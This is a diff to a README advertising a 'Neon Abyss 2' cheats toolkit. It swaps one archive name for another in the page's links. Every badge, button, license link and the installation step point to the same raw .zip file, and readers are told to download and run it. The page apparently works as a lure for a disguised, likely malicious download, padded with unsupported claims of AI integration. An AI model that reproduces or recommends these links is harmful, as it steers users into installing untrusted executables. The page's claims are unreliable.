@@ -1,18 +1,18 @@
 # 🕹️ Neon Abyss 2 Cheats & Hacks Collection
 
-[![Stars](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip)](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip)
-[![License: MIT](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip)](#-mit-license)
-[![Issues](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip)](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip)
-[![Last Commit](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip)](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip)
-[![OpenAI API Ready](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip%20API-Integrated-blue)](#-integration-with-openai-api-and-claude-api)
+[![Stars](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip)](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip)
+[![License: MIT](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip)](#-mit-license)
+[![Issues](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip)](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip)
+[![Last Commit](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip)](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip)
+[![OpenAI API Ready](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip%20API-Integrated-blue)](#-integration-with-openai-api-and-claude-api)
 
 Welcome to the **Neon Abyss 2 Cheats & Hacks Collection**–the delightful digital vault for unlocking the full rainbow spectrum of possibilities within *Neon Abyss 2*! Whether you’re seeking to blaze past tough stages, sculpt your experience with customized powers, or discover behind-the-scenes wonders, this toolkit offers an arsenal beyond the ordinary. Built with innovation, flexibility, and player delight in mind, our project is a blend of creative coding and cutting-edge AI.
 
 ---
 
 <div align="center">
-  <a href="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip">
-    <img src="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip" alt="Download Neon Abyss 2 Cheats & Hacks" width="240"/>
+  <a href="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip">
+    <img src="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip" alt="Download Neon Abyss 2 Cheats & Hacks" width="240"/>
   </a>
 </div>
 
@@ -82,14 +82,14 @@ Have a question at 3 AM? Facing a game-breaking conundrum? Our AI-augmented team
 ## 🚀 Installation: Getting Started
 
 **Step 1:**  
-Head to our golden vault and grab the latest installer at: **https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip**
+Head to our golden vault and grab the latest installer at: **https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip**
 
 **Step 2:**
 Click the button below to initiate your Neon Abyss 2 transformation!
 
 <div align="center">
-  <a href="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip">
-    <img src="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip" alt="Download Neon Abyss 2 Cheats & Hacks" width="240"/>
+  <a href="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip">
+    <img src="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip" alt="Download Neon Abyss 2 Cheats & Hacks" width="240"/>
   </a>
 </div>
 
@@ -114,7 +114,7 @@ Run the downloaded file. Follow the step-by-step wizard:
 ## 📜 MIT License
 
 Distributed under the MIT License (c) 2025. Feel free to remix, improve, and share—just honor the spirit of openness!  
-Review full license details here: [MIT LICENSE](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip)
+Review full license details here: [MIT LICENSE](https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip)
 
 ---
 
@@ -123,8 +123,8 @@ Review full license details here: [MIT LICENSE](https://github.com/rishikeshjosh
 Ready to discover a new dimension in *Neon Abyss 2*? Seize the tools that ignite possibilities, with innovation powered by AI companionship and a team that never sleeps.
 
 <div align="center">
-  <a href="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip">
-    <img src="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon-insider-abyss-toolkit-v3.6.zip" alt="Download Neon Abyss 2 Cheats & Hacks" width="240"/>
+  <a href="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip">
+    <img src="https://github.com/rishikeshjoshy/neon-abyss-2-insider-toolkit/raw/refs/heads/branch/Fitzroy/neon_insider_toolkit_abyss_v1.7-beta.1.zip" alt="Download Neon Abyss 2 Cheats & Hacks" width="240"/>
   </a>
 </div>
 
